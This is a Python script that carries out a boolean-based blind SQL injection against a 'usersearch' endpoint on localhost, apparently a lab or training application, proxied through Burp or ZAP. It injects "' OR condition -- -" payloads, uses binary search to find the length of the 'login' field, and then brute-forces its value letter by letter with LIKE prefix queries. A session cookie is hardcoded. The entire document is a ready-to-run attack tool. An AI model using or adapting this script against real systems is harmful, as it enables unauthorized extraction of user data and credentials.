import requests
import string

# Target URL
url = "http://127.0.0.1:9090/app/usersearch"

# Headers (Including Cookie for Session Persistence)
headers = {
    "Host": "127.0.0.1:9090",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "http://127.0.0.1:9090",
    "Referer": "http://127.0.0.1:9090/app/usersearch",
    "Connection": "keep-alive",
}

# Cookies (Modify if session expires)
cookies = {
    "connect.sid": "s%3Agl18CJKnMXsfrpsgQSwJr3chppdDu9TI.wW5i9lyy0mgL2yAYDe80yOr0X6r2Yl%2BkACmdU2y%2BPo4"
}

# Proxy settings (Modify if Burp/ZAP is on a different port)
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}

# Define character set for brute-forcing (A-Z, a-z)
charset = string.ascii_letters  # "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"

# Function to check if the SQL query returns True (valid result)
def boolean_query(condition):
    payload = f"' OR {condition} -- -"
    data = {"login": payload}
    print(f"[*] SQLi Payload: {payload}")  # Print the injected query
    response = requests.post(url, headers=headers, cookies=cookies, data=data, proxies=proxies, verify=False)
    return "Search Result" in response.text

# Function to determine the length of the `login` field
def get_field_length():
    low, high = 1, 100  # Set reasonable bounds
    print("\n[+] Determining length of `login` field...\n")

    while low <= high:
        mid = (low + high) // 2
        print(f"[DEBUG] low={low}, high={high}, mid={mid}")  # Real-time tracking

        if boolean_query(f"(SELECT LENGTH(login) = {mid})"):
            print(f"[+] Found `login` length: {mid}\n")
            return mid  # Exact length found
        elif boolean_query(f"(SELECT LENGTH(login) > {mid})"):
            low = mid + 1
            print(f"[DEBUG] Increasing lower bound to {low}\n")
        else:
            high = mid - 1
            print(f"[DEBUG] Decreasing upper bound to {high}\n")

    print(f"[+] `login` length determination complete: {low}\n")
    return low  # Fallback return

# Function to brute-force `login` using `LIKE` (prefix matching)
def brute_force_login(length):
    print(f"\n[+] Brute-forcing `login` value (length = {length}) using `LIKE` condition...\n")
    extracted_login = ""

    for i in range(1, length + 1):
        for char in charset:
            test_prefix = extracted_login + char
            print(f"[DEBUG] Trying Prefix: '{test_prefix}'")

            if boolean_query(f"login LIKE '{test_prefix}%'"):
                print(f"[+] Found character at position {i}: {char}")
                extracted_login += char
                print(f"[+] Extracted so far: {extracted_login}")
                break  # Move to next character

    print(f"\n[+] Final Extracted `login`: {extracted_login}\n")
    return extracted_login

# Determine the length of `login`
login_length = get_field_length()

print(f"[+] Final Result: Login field length = {login_length}")

# Brute-force the login username using `LIKE`
brute_forced_login = brute_force_login(login_length)